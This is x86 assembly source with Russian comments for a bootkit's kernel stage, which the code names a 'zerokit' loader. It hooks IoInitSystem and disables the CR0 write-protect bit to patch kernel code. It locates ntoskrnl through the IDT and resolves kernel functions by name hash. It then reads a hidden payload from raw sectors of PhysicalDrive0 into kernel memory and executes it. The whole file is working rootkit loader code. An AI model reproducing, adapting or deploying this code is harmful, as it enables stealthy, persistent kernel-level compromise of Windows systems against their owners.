use32

push   dword [esp + 4] ; Сохраняем в стеке аргумент переданный для функции IoInitSystem.
push   eax ; адрес Execute_Kernel_Code, куда будет передано управление после выполнения IoInitSystem.
push   eax ; Здесь будет лежать абсолютный адрес до IoInitSystem.

pushad ; +32 в стек
pushfd ; +4 в стек
cld

; Сбрасываем бит протекции записи (16 бит).
mov    eax, cr0
push   eax ; +4 в стек
and    eax, 0xFFFEFFFF
mov    cr0, eax

call   dword Get_Current_EIP_0
Get_Current_EIP_0:
pop    esi
add    esi, orig_addr_value - Get_Current_EIP_0 ; esi = абсолютный адрес orig_addr_value.

mov    eax, [esi] ; eax = аюсолютный адрес IoInitSystem.
mov    [esp + 40], eax ; Ложим адрес возврата в IoInitSystem.

; Восстанавливаем оригининальный адрес, которые мы заменили на свой.
mov    edi, [esp + 52] ; edi = адрес вовзрата из нашего хука в ntoskrnl.
sub    eax, edi ; Вычисляем дистанцию относительный адреса возврада до IoInitSystem.
mov    [edi - 4], eax

; set return eip of the forwarded function to execute_payload_x32
lea    eax, [esi + execute_payload_x32 - orig_addr_value] ; eax = абсолютный адрес execute_payload_x32
mov    [esp + 44], eax

; Восстанавливаем WP-бит.
pop    eax
mov    cr0, eax

popfd
popad
ret ; Передаём управление на IoInitSystem.


; Здесь мы получаем управление после завершения работы функции IoInitSystem.
execute_payload_x32:
pushad
pushfd
cld

sub    esp, 26 ; Выделяем место в стеке для IDT и адресов необходимых функций.

; store IDTR on stack
sidt   [esp] ; Сохраняем IDT регистр в стек (6 байт)
pop    bx ; 16 bit IDT limit
pop    ebx ; 32 bit IDT address
mov    ebp, esp
add    ebp, 4 ; (ebp - 20) = Место для hFile, который проинициализирует функция ZwCreateFile.

;typedef struct _IDT_ENTRY
;{
;	uint16_t offset00_15;
;	uint16_t selector;
;	uint8_t unused:5;
;	uint8_t zeroes:3;
;	uint8_t gateType:5;
;	uint8_t dpl:2;
;	uint8_t p:1;
;	uint16_t offset16_31;
;} IDT_ENTRY, *PIDT_ENTRY;
mov    eax, [ebx + 4] ; Offset 16..31  [Interrupt Gate Descriptor]
mov    ax, [ebx] ; Offset 0..15   [Interrupt Gate Descriptor]
and    ax, 0xF000 ; Выравниваем адрес по границе страницы.
xchg   eax, ebx

; Начиная с обработчика прерывания методом спуска ищем базу ядра (ntoskrnl.exe).
find_pe_image_base_loop:
sub    ebx, 4096 ; Спускаемся на страницу ниже.
cmp    word [ebx], 'MZ' ; Проверяем на наличие сигнатуры MZ.
jnz    find_pe_image_base_loop
mov    eax, [ebx + 0x3c] ; Получаем смещение относительно начала образа до PE заголовка.
cmp    dword [ebx + eax], 'PE' ; Проверяем наличие сигнатуры PE заголовка.
jnz    find_pe_image_base_loop
cmp    word [ebx + eax + 0x18], 0x010B ; Проверяем Magic
jnz    find_pe_image_base_loop

call   dword data_addr_call

; Хеш-суммы функций, которые нам нужны для запуска зерокита (в алфавитном порядке - специфика алгоритма).
ExAllocatePoolWithTag dd 0x756CEEDA ; ebp-16
ZwClose               dd 0x9292AAB1 ; ebp-12
ZwCreateFile          dd 0xB8D72BA8 ; ebp-8
ZwReadFile            dd 0x9652DDAC ; ebp-4
                      dd 000000000h ; hash zero terminator (no more hash following)

data_addr_call:
lea    edx, [ebx + eax] ; edx = адрес PE заголовка.
mov    ecx, [edx + 0x50] ; ecx = размер образа (SizeOfImage).
mov    edi, ebx ; edi = база образа.

; Используя таблицу экспорта, находим адресу нужных функций по их хешам.
mov    edx, [edx + 0x78] ; [edx + OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress].
add    edx, ebx ; edx = абсолютный адрес до секции экспорта.
xor    ecx, ecx

;typedef struct _IMAGE_EXPORT_DIRECTORY {
;	uint32_t   Characteristics;
;	uint32_t   TimeDateStamp;
;	uint16_t    MajorVersion;
;	uint16_t    MinorVersion;
;	uint32_t   Name;
;	uint32_t   Base;
;	uint32_t   NumberOfFunctions;
;	uint32_t   NumberOfNames;
;	uint32_t   AddressOfFunctions;     // RVA from base of image
;	uint32_t   AddressOfNames;         // RVA from base of image
;	uint32_t   AddressOfNameOrdinals;  // RVA from base of image
;} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
next_export_loop:
;  ecx      export counter
;  ebx      still base of ntoskrnl image (points to DOS Header)
;  esi      Export Name
;  edi      Hash Value
;  [esp]    Pointer to Next Hash
;  ebp      Pointer to Stack Variables
inc    ecx
mov    esi, [edx + 0x20] ; [edx + AddressOfNames].
add    esi, ebx ; абсолютный адрес.
mov    esi, [esi + 4 * ecx]
add    esi, ebx ; esi = адрес, где лежит имя очередной экспортируемой функции.

xor    eax, eax
xor    edi, edi

; Вычисляем хеш-значение для имени функции.
calc_name_hash_loop:
lodsb
or     al, al
jz     Hash_Generated
ror    edi, 11
add    edi, eax
jmp    calc_name_hash_loop

Hash_Generated:
mov    esi, [esp] ; esi = абсолютный адрес таблицы с хешами функций.
lodsd ; Считываем очередное хеш-значение.
or     eax, eax ; Конец?
jz     all_hashes_resolved ; Завершаем поиск адресов функций.
cmp    edi, eax ; Совдапают хеши?
jnz    next_export_loop ; Если не совпадают, переходим к следующей функции.
mov    [esp], esi ; Обновляем указатель на таблицу хешей.
mov    edi, [edx + 0x24] ; [edx + AddressOfNameOrdinals].
add    edi, ebx ; абсолютный адрес.
movzx  eax, word [edi + 2 * ecx] ; index внутри таблицы ординалов.
mov    edi, [edx + 0x1C] ; [edx + AddressOfFunctions].
add    edi, ebx ; абсолютный адрес.
mov    eax, [edi + 4 * eax] ; lookup the address
add    eax, ebx ; eax = адрес экспортируемой функции.
xchg   edi, ebp ; edi = адрес, куда будет сохранён адрес функции.
stosd ; сохраняем адрес.
xchg   edi, ebp ; ebp = адрес, где будет сохранён адрес следующей экспортируемой функции.
jmp    next_export_loop

all_hashes_resolved:
mov    esi, [esp] ; esi = абсолютный адрес data_addr_call - 4.
add    esi, payload_data - data_addr_call + 4
mov    [esp], esi

; Инициализируем структуру IO_STATUS_BLOCK в стеке.
;typedef struct _IO_STATUS_BLOCK {
;    union {
;        NTSTATUS Status;
;        PVOID Pointer;
;    } DUMMYUNIONNAME;
;
;    ULONG_PTR Information;
;} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
push   eax ; IoStatusBlock.Information
push   eax ; IoStatusBlock.DUMMYUNIONNAME
mov    edi, esp ; edi points to 2 dwords data buffer (zeroed out)

mov    ebx, esi ; ebx = указатель на местоположение данные о зероките.

; Инициализируем структуру UNICODE_STRING в стеке.
;typedef struct _UNICODE_STRING {
;    USHORT Length;
;    USHORT MaximumLength;
;    __field_bcount_part(MaximumLength, Length) PWCH   Buffer;
;} UNICODE_STRING;
add    esi, disk_name_data - payload_data ; esi = абсолютный адрес к имени файлу.
push   esi ; &length
add    dword [esp], 4 ; Buffer = абсолютный адрес строки с названием диска.
push   dword [esi] ; Сохраняем длину Length и MaximumLength.
mov    esi, esp

; Инициализируем структуру OBJECT_ATTRIBUTES в стеке.
;typedef struct _OBJECT_ATTRIBUTES {
;    ULONG Length;
;    HANDLE RootDirectory;
;    PUNICODE_STRING ObjectName;
;    ULONG Attributes;
;    PVOID SecurityDescriptor;        // Points to type SECURITY_DESCRIPTOR
;    PVOID SecurityQualityOfService;  // Points to type SECURITY_QUALITY_OF_SERVICE
;} OBJECT_ATTRIBUTES;
push   eax ; SecurityQualityOfService  = NULL
push   eax ; SecurityDescriptor        = NULL
push   dword 00000240h ; Attributes    = OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE
push   esi ; ObjectName                = "\??\PhysicalDrive0"
push   eax ; RootDirectory             = NULL
push   dword 24 ; Length               = sizeof(OBJECT_ATTRIBUTES)
mov    esi, esp

; Прототип функции.
;NTSTATUS ZwCreateFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes,
;ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
; ZwCreateFile(&FileHandle, GENERIC_READ | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock, 0, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, NULL)
push   eax ; EaLength                       = NULL
push   eax ; EaBuffer                       = NULL
push   dword 0x00000020 ; CreateOptions     = FILE_SYNCHRONOUS_IO_NONALERT
push   dword 0x00000001 ; CreateDisposition = FILE_OPEN
push   dword 0x00000003 ; ShareAccess       = FILE_SHARE_READ | FILE_SHARE_WRITE
push   eax ; FileAttributes                 = 0
push   eax ; AllocationSize                 = 0 (automatic)
push   edi ; IoStatusBlock                  = адрес структуры в стеке.
push   esi ; ObjectAttributes               = адрес структуры в стеке.
push   dword 80100000h ; DesiredAccess      = GENERIC_READ | SYNCHRONIZE
lea    eax, [ebp - 20]
push   eax ; FileHandle
call   dword [ebp - 8]
add    esp, 8 * 4 ; Освобождаем в стеке место выделенное для OBJECT_ATTRIBUTES и UNICODE_STRING.
or     eax, eax ; eax == STATUS_SUCCESS?
jnz    execute_payload_x32_exit

; Прототип функции:
; PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Tag);
; ExAllocatePoolWithTag(NonPagedPool, zerokitSize, 0x74696E49);
push   dword 0x74696E49 ; Tag
push   dword [ebx + 8] ; Размер выделяемых данных.
push   dword 0 ; NonPagedPool.
call   dword [ebp - 16]
or     eax, eax
jz     execute_payload_x32_close_file_and_exit
mov    esi, eax ; esi = адрес, куда будет загружен зерокит.

; Подготавливаем структуру LARGE_INTEGER в стеке.
push   dword [ebx + 4]
push   dword [ebx]
mov    edx, esp ; edx = абсолютный адрес структруры LARGE_INTEGER. 

mov    [edi], dword 0
mov    [edi + 4], dword 0

; Прототип функции:
; NTSTATUS ZwReadFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID Buffer, ULONG Length, PLARGE_INTEGER ByteOffset, PULONG Key);
; ZwReadFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, Buffer, zerokitSize, offset, 0);
xor    eax, eax
push   eax ; Key                     = 0 (no unlocking key needed)
push   edx ; ByteOffset              = смещение до сектора, где лежит зерокит (в байтах).
push   dword [ebx + 8] ; Length      = this is the allocated size
push   esi ; Buffer                  = адрес выделенного ранее буфера для зерокита.
push   edi ; IoStatusBlock           = Указатель на IO_STATUS_BLOCK.
push   eax ; ApcContext              = NULL (no async procedure param)
push   eax ; ApcRoutine              = NULL (no async procedure call)
push   eax ; Event                   = NULL (do nothing)
push   dword [ebp - 20] ; FileHandle = описатель, который вернула функция ZwCreateFile
call   dword [ebp - 4]
or     eax, eax
jnz    execute_payload_x32_close_file_and_exit

; Передаём управление зерокиту.
;typedef struct _mod_header
;{
;	uint32_t fakeBase;      // Фейковая база для вычисления реальных смещений.
;	uint64_t crc;           // 64-битная контрольная сумма вычисленная по телу mod-а.
;	uint32_t sizeOfMod;     // Размер тела, которое начинается сразу после данного заголовка.
;	uint32_t entryPointRVA; // RVA точки входа относительно заголовка.
;	uint32_t reserved1;     // 
;	uint32_t reserved2;
;	uint32_t reserved3;
;} mod_header_t, *pmod_header_t;
mov edx, [esi + 16] ; edx = виртуальный адрес entryPointRVA.
mov eax, esi
add eax, edx ; абсолютный адрес entryPointRVA.
push dword 0
push esi ; База зерокита.
call eax ; Вызываем точку входа mod_common.

execute_payload_x32_close_file_and_exit:
; Прототип функции:
; NTSTATUS ZwClose(HANDLE Handle);
; ZwClose(FileHandle);
push   dword [ebp - 20] ; описатель файла.
call   dword [ebp - 12]

execute_payload_x32_exit:
mov esp, ebp ; Удаляем стековые параметры.
popfd
popad
ret 4

payload_data:
LoaderOffsetLo dd 0
LoaderOffsetHi dd 0
LoaderSize dd 0 

orig_addr_value:
nop
nop
nop
nop

disk_name_data: